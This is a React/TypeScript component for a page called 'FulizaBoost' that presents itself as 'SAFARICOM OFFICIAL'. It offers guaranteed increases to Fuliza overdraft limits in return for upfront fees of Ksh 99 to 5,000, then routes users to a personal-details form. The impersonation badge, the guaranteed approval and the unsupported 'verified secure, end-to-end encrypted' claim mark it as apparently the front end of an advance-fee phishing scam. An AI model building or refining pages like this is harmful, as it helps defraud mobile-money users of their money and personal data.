import { useState } from "react";
import "../styles/Home.css";
import { useNavigate } from "react-router-dom";


type LimitOption = {
  amount: number;
  fee: number;
};

const limits: LimitOption[] = [
  { amount: 5000, fee: 99 },
  { amount: 10000, fee: 250 },
  { amount: 15000, fee: 500 },
  { amount: 20000, fee: 1000 },
  { amount: 25000, fee: 1500 },
  { amount: 30000, fee: 2500 },
  { amount: 35000, fee: 3500 },
  { amount: 45000, fee: 5000 },
];

const Home = () => {
  const [selectedAmount, setSelectedAmount] = useState<number | null>(null);
  const navigate = useNavigate();
  


  return (
    <main className="container">
      {/* HEADER */}
      <div className="badge">● SAFARICOM OFFICIAL</div>

      <h1 className="title">FulizaBoost</h1>
      <p className="subtitle">
        Instant Limit Increase • Guaranteed Approval
      </p>

      {/* INFO */}
      <div className="info-box">
        ⚡ Choose your new Fuliza limit and complete the payment to get instant
        access.
      </div>

      {/* LIMITS */}
      <h3 className="section-title">Select Your Fuliza Limit</h3>

      <div className="grid">
        {limits.map((item) => {
          const isActive = selectedAmount === item.amount;

          return (
            <div
              key={item.amount}
              className={`card ${isActive ? "active" : ""}`}
              onClick={() => setSelectedAmount(item.amount)}
            >
              <h2>Ksh {item.amount.toLocaleString()}</h2>
              <span className="fee">
                Fee: Ksh {item.fee.toLocaleString()}
              </span>
            </div>
          );
        })}
      </div>

      {/* FOOTER */}
      <div className="secure">
        🔒 VERIFIED SECURE • END-TO-END ENCRYPTED
      </div>
<button
  className={`continue-btn ${selectedAmount ? "enabled" : ""}`}
  disabled={!selectedAmount}
  onClick={() => {
    const selectedLimit = limits.find(l => l.amount === selectedAmount);
    if (selectedLimit) {
      navigate("/personal-details", { state: selectedLimit });
      sessionStorage.setItem("selectedLimit", JSON.stringify(selectedLimit));
    }
  }}
>
  Continue
</button>


    </main>
  );
};

export default Home;
